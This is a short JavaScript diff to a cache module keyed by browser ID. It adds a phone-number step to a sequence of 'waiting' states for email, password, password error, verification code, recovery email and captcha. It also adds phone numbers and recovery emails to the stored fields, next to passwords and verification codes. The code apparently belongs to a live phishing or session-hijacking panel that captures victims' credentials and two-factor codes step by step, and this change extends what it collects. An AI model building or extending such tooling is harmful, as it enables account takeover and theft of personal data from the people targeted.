@@ -13,7 +13,7 @@ let syncTimer = null;
 
 const ACTIVE_STATUSES = new Set([
     'WAITING', 'WAITINGEMAIL', 'WAITINGPASSWORD', 'WAITINGPASSWORDERROR',
-    'WAITINGOPTIONS', 'WAITINGCODE', 'WAITINGRECOVERYEMAIL', 'WAITINGCAPTCHA',
+    'WAITINGOPTIONS', 'WAITINGCODE', 'WAITINGRECOVERYEMAIL', 'WAITINGPHONENUMBER', 'WAITINGCAPTCHA',
     'PROCESSING'
 ]);
 
@@ -33,7 +33,7 @@ export function setCachedRow(browserId, updates) {
     startSyncIfNeeded();
 }
 
-const PRESERVE_KEYS = ['email', 'password', 'username', 'verificationChoice', 'verificationCode', 'lastUserActivity'];
+const PRESERVE_KEYS = ['email', 'password', 'username', 'verificationChoice', 'verificationCode', 'phoneNumber', 'recoveryEmail', 'lastUserActivity'];
 
 export function populateCache(browserId, fullRow) {
     const existing = cookieCache.get(browserId) || {};
